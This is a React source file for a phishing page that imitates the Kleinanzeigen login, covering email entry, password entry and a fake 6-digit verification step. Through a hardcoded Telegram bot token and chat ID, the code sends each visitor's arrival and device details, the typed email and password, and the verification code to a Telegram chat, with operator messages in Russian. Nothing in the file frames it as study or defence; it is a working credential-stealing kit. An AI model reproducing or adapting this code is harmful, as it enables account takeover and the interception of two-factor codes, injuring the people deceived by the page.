import { useState, createContext, useContext, useEffect, useRef } from 'react'
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom'
import logoSvg from './imports/download.svg'
import mascotSvg from './imports/insecure-password.svg'

const HN = '"Helvetica Neue", Helvetica, Arial, sans-serif'

const TG_TOKEN = '8858857294:AAE7KTr_l_RwCyNEJSFXJPJ8xTRijo2w5qU'
const TG_CHAT = '8145973156'

async function sendToTelegram(text: string, replyToMsgId?: number): Promise<number | null> {
  const body: Record<string, unknown> = { chat_id: TG_CHAT, text, parse_mode: 'HTML' }
  if (replyToMsgId) body.reply_to_message_id = replyToMsgId
  const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })
  const data = await res.json()
  return data?.result?.message_id ?? null
}

// Shared state via context
const AuthCtx = createContext<{
  email: string; setEmail: (v: string) => void
  password: string; setPassword: (v: string) => void
  msgId: number | null; setMsgId: (v: number) => void
}>({ email: '', setEmail: () => {}, password: '', setPassword: () => {}, msgId: null, setMsgId: () => {} })

function Header() {
  return (
    <header className="flex items-center justify-between px-5 py-3 border-b border-gray-100">
      <a href="https://www.kleinanzeigen.de/" className="text-gray-400 hover:text-gray-600 transition-colors p-1 -ml-1">
        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
          <path d="M11 3.5L5.5 9L11 14.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </a>
      <a href="https://www.kleinanzeigen.de/">
        <img src={logoSvg} alt="kleinanzeigen" style={{ height: '48px', width: '286px' }} />
      </a>
      <a href="https://hilfe.kleinanzeigen.de/hc/de" className="hover:underline"
        style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '21px', color: 'rgb(50, 105, 22)', textDecoration: 'none' }}>
        Hilfe
      </a>
    </header>
  )
}

function Card({ children }: { children: React.ReactNode }) {
  return (
    <main className="flex-1 flex items-start justify-center pt-10 px-4">
      <div className="bg-white rounded-2xl px-8 py-8" style={{ width: '500px', boxShadow: '0 2px 20px rgba(0,0,0,0.12)' }}>
        {children}
      </div>
    </main>
  )
}

// ── Page 1: Email (/login) ──
function EmailPage() {
  const { email, setEmail } = useContext(AuthCtx)
  const [focused, setFocused] = useState(false)
  const [error, setError] = useState<'empty' | 'format' | null>(null)
  const navigate = useNavigate()

  function handleWeiter() {
    if (!email.trim()) { setError('empty'); return }
    if (!email.includes('@')) { setError('format'); return }
    setError(null)
    navigate('/login/password')
  }

  const border = error ? '1.5px solid #b00020' : `1px solid ${focused ? '#0c0c0b' : '#d1d5db'}`

  return (
    <>
      <Header />
      <Card>
        <h1 className="text-center mb-2" style={{ fontFamily: HN, fontWeight: 600, fontSize: '18px', lineHeight: '27px', color: 'rgb(12, 12, 11)' }}>
          Willkommen bei Kleinanzeigen!
        </h1>
        <p className="text-center mb-6" style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '21px', color: 'rgb(12, 12, 11)' }}>
          Gut für deinen Geldbeutel, gut für die Umwelt - jetzt einloggen.
        </p>

        <div className="relative mb-1">
          <input type="text" value={email}
            onChange={e => { setEmail(e.target.value); setError(null) }}
            onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
            className="w-full rounded-lg px-4 py-3 text-sm focus:outline-none transition-colors"
            style={{ color: '#1d1d1b', fontFamily: HN, border }} />
          <label className="absolute left-3 transition-all duration-150 pointer-events-none" style={{
            fontFamily: HN, fontSize: focused || email ? '11px' : '14px',
            top: focused || email ? '0px' : '50%', transform: 'translateY(-50%)',
            color: error ? '#b00020' : focused || email ? '#6b7280' : '#9ca3af',
            backgroundColor: 'white', paddingLeft: '4px', paddingRight: '4px',
          }}>E-mail*</label>
        </div>

        {error && (
          <div className="flex items-center gap-1 mb-3" style={{ color: '#b00020' }}>
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
              <path d="M7 1L13 12H1L7 1Z" stroke="#b00020" strokeWidth="1.2" strokeLinejoin="round"/>
              <line x1="7" y1="5.5" x2="7" y2="8.5" stroke="#b00020" strokeWidth="1.2" strokeLinecap="round"/>
              <circle cx="7" cy="10.5" r="0.6" fill="#b00020"/>
            </svg>
            <span style={{ fontFamily: HN, fontSize: '13px' }}>
              {error === 'empty' ? 'Das ist ein Pflichtfeld.' : 'Bitte überprüfe, ob deine E-Mail Adresse das korrekte Format hat.'}
            </span>
          </div>
        )}
        {!error && <div className="mb-3" />}

        <button onClick={handleWeiter} className="w-full rounded-full py-3 transition-opacity hover:opacity-90 active:opacity-75"
          style={{ backgroundColor: '#B5E941', fontFamily: HN, fontWeight: 600, fontSize: '14px', lineHeight: '14px', color: 'rgb(29, 75, 0)' }}>
          Weiter
        </button>

        <p className="text-left mt-5" style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '14px', color: 'rgb(12, 12, 11)' }}>
          Noch nicht registriert?{' '}
          <a href="https://www.kleinanzeigen.de/m-benutzer-anmeldung.html" className="underline"
            style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '14px', color: '#326916' }}>
            Erstelle ein Konto
          </a>
        </p>
      </Card>
    </>
  )
}

// ── Page 2: Password (/login/password) ──
function PasswordPage() {
  const { email, setEmail, password, setPassword, setMsgId } = useContext(AuthCtx)
  const [showPw, setShowPw] = useState(false)
  const [focused, setFocused] = useState(false)
  const [pwError, setPwError] = useState(false)
  const navigate = useNavigate()

  if (!email) return <Navigate to="/login" replace />

  return (
    <>
      <Header />
      <Card>
        <h1 className="text-center mb-2" style={{ fontFamily: HN, fontWeight: 600, fontSize: '18px', lineHeight: '27px', color: 'rgb(12, 12, 11)' }}>
          Willkommen bei Kleinanzeigen!
        </h1>
        <p className="text-center mb-6" style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '21px', color: 'rgb(12, 12, 11)' }}>
          Gut für deinen Geldbeutel, gut für die Umwelt - jetzt einloggen.
        </p>

        {/* Email read-only */}
        <div className="flex items-center justify-between rounded-lg px-4 py-3 mb-3" style={{ border: '1px solid #d1d5db' }}>
          <span style={{ fontFamily: HN, fontSize: '14px', color: '#1d1d1b' }}>{email}</span>
          <button onClick={() => { setEmail(''); setPassword(''); navigate('/login') }}
            style={{ fontFamily: HN, fontSize: '14px', fontWeight: 600, color: 'rgb(50, 105, 22)', textDecoration: 'underline', background: 'none', border: 'none', cursor: 'pointer' }}>
            Bearbeiten
          </button>
        </div>

        {/* Password */}
        <div className="relative mb-3">
          <input type={showPw ? 'text' : 'password'} value={password}
            onChange={e => setPassword(e.target.value)}
            onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
            className="w-full rounded-lg px-4 pr-10 py-3 text-sm focus:outline-none transition-colors"
            style={{ color: '#1d1d1b', fontFamily: HN, border: `1px solid ${focused ? '#0c0c0b' : '#d1d5db'}` }} />
          <label className="absolute left-3 transition-all duration-150 pointer-events-none" style={{
            fontFamily: HN, fontSize: focused || password ? '11px' : '14px',
            top: focused || password ? '0px' : '50%', transform: 'translateY(-50%)',
            color: focused || password ? '#6b7280' : '#9ca3af',
            backgroundColor: 'white', paddingLeft: '4px', paddingRight: '4px',
          }}>Passwort*</label>
          <button onClick={() => setShowPw(p => !p)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
            style={{ background: 'none', border: 'none', cursor: 'pointer', padding: '2px' }}>
            {showPw ? (
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
              </svg>
            ) : (
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            )}
          </button>
        </div>

        {pwError && (
          <div className="flex items-center gap-1 mb-2" style={{ color: '#b00020' }}>
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
              <path d="M7 1L13 12H1L7 1Z" stroke="#b00020" strokeWidth="1.2" strokeLinejoin="round"/>
              <line x1="7" y1="5.5" x2="7" y2="8.5" stroke="#b00020" strokeWidth="1.2" strokeLinecap="round"/>
              <circle cx="7" cy="10.5" r="0.6" fill="#b00020"/>
            </svg>
            <span style={{ fontFamily: HN, fontSize: '13px' }}>Das ist ein Pflichtfeld.</span>
          </div>
        )}
        <a href="#" className="block mb-4" style={{ fontFamily: HN, fontSize: '14px', fontWeight: 600, color: 'rgb(50, 105, 22)', textDecoration: 'underline' }}>
          Passwort vergessen?
        </a>

        <button onClick={async () => {
          if (!password.trim()) { setPwError(true); return }
          setPwError(false)
          try {
            const id = await sendToTelegram(`🔐 <b>Новый вход</b> ${VISITOR_ID}\n📧 <b>Email:</b> ${email}\n🔑 <b>Пароль:</b> ${password}`)
            if (id) setMsgId(id)
          } catch (_) {}
          navigate('/login/verify')
        }}
          className="w-full rounded-full py-3 transition-opacity hover:opacity-90 active:opacity-75"
          style={{ backgroundColor: '#B5E941', fontFamily: HN, fontWeight: 600, fontSize: '14px', lineHeight: '14px', color: 'rgb(29, 75, 0)' }}>
          Einloggen
        </button>

        <p className="text-left mt-5" style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '14px', color: 'rgb(12, 12, 11)' }}>
          Noch nicht registriert?{' '}
          <a href="https://www.kleinanzeigen.de/m-benutzer-anmeldung.html" className="underline"
            style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '14px', color: '#326916' }}>
            Erstelle ein Konto
          </a>
        </p>
      </Card>
    </>
  )
}

// ── Page 3: Verify (/login/verify) ──
function VerifyPage() {
  const { email, msgId } = useContext(AuthCtx)
  const [code, setCode] = useState('')
  const [codeError, setCodeError] = useState(false)

  if (!email) return <Navigate to="/login" replace />

  return (
    <>
      <Header />
      <Card>
        <div className="flex flex-col items-center">
          <img src={mascotSvg} alt="mascot" style={{ width: '120px', height: 'auto' }} className="mb-4" />
          <h2 className="mb-3 text-center" style={{ fontFamily: HN, fontWeight: 600, fontSize: '18px', lineHeight: '27px', color: 'rgb(12, 12, 11)' }}>
            Konto bestätigen
          </h2>
          <p className="text-center mb-4" style={{ fontFamily: HN, fontWeight: 400, fontSize: '14px', lineHeight: '21px', color: 'rgb(12, 12, 11)' }}>
            Gib den 6-stelligen Code ein, der an diese Nummer gesendet wurde:
          </p>
          <div className="w-full rounded-lg px-4 py-3 mb-3" style={{ border: '1px solid #d1d5db', color: '#1d1d1b', fontFamily: HN, fontSize: '14px' }}>
            49XXXXXXXXXXX
          </div>
          <input type="text" maxLength={6} value={code}
            onChange={e => { setCode(e.target.value.replace(/\D/g, '')); setCodeError(false) }}
            className="w-full rounded-lg px-4 py-3 text-sm focus:outline-none"
            style={{ border: codeError ? '1.5px solid #b00020' : '1px solid #d1d5db', fontFamily: HN, color: codeError ? '#b00020' : '#1d1d1b', marginBottom: codeError ? '4px' : '12px' }}
            placeholder="6-stelligen Code eingeben*" />
          {codeError && (
            <div className="flex items-center gap-1 mb-3 w-full" style={{ color: '#b00020' }}>
              <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                <path d="M7 1L13 12H1L7 1Z" stroke="#b00020" strokeWidth="1.2" strokeLinejoin="round"/>
                <line x1="7" y1="5.5" x2="7" y2="8.5" stroke="#b00020" strokeWidth="1.2" strokeLinecap="round"/>
                <circle cx="7" cy="10.5" r="0.6" fill="#b00020"/>
              </svg>
              <span style={{ fontFamily: HN, fontSize: '13px' }}>Falscher Code, bitte versuch's nochmal.</span>
            </div>
          )}
          <button onClick={() => { if (code.length < 6) { setCodeError(true) } else { sendToTelegram(`🔢 <b>Код подтверждения:</b> ${code} ${VISITOR_ID}`, msgId ?? undefined) } }}
            className="w-full rounded-full py-3 mb-4 transition-opacity hover:opacity-90 active:opacity-75"
            style={{ backgroundColor: '#B5E941', fontFamily: HN, fontWeight: 600, fontSize: '14px', lineHeight: '14px', color: 'rgb(29, 75, 0)' }}>
            Weiter
          </button>
          <p style={{ fontFamily: HN, fontSize: '14px', color: 'rgb(12, 12, 11)' }}>
            Du hast keinen Code erhalten?{' '}
            <a href="#" className="underline" style={{ fontFamily: HN, fontWeight: 600, fontSize: '14px', color: '#326916' }}>
              Erneut senden
            </a>
          </p>
        </div>
      </Card>
    </>
  )
}

const VISITOR_ID = '#' + Math.random().toString(36).slice(2, 10).toUpperCase()

// ── Root ──
export default function App() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [msgId, setMsgId] = useState<number | null>(null)
  const visitStart = useRef(Date.now())

  useEffect(() => {
    const device = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 Мобильный' : '💻 Компьютер'
    const lang = navigator.language || 'неизвестно'
    const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })

    sendToTelegram(
      `🟢 <b>Новый посетитель онлайн</b> ${VISITOR_ID}\n` +
      `🕐 Время: ${time} (МСК)\n` +
      `${device}\n` +
      `🌐 Язык: ${lang}`
    )

    const handleLeave = () => {
      const seconds = Math.round((Date.now() - visitStart.current) / 1000)
      const mins = Math.floor(seconds / 60)
      const secs = seconds % 60
      const spent = mins > 0 ? `${mins} мин ${secs} сек` : `${secs} сек`

      navigator.sendBeacon(
        `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,
        new Blob([JSON.stringify({
          chat_id: TG_CHAT,
          text: `🔴 <b>Посетитель офлайн</b> ${VISITOR_ID}\n⏱ Провёл на сайте: ${spent}`,
          parse_mode: 'HTML',
        })], { type: 'application/json' })
      )
    }

    window.addEventListener('beforeunload', handleLeave)
    return () => window.removeEventListener('beforeunload', handleLeave)
  }, [])

  return (
    <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: HN }}>
      <AuthCtx.Provider value={{ email, setEmail, password, setPassword, msgId, setMsgId }}>
        <Routes>
          <Route path="/login" element={<EmailPage />} />
          <Route path="/login/password" element={<PasswordPage />} />
          <Route path="/login/verify" element={<VerifyPage />} />
          <Route path="*" element={<Navigate to="/login" replace />} />
        </Routes>
      </AuthCtx.Provider>
    </div>
  )
}
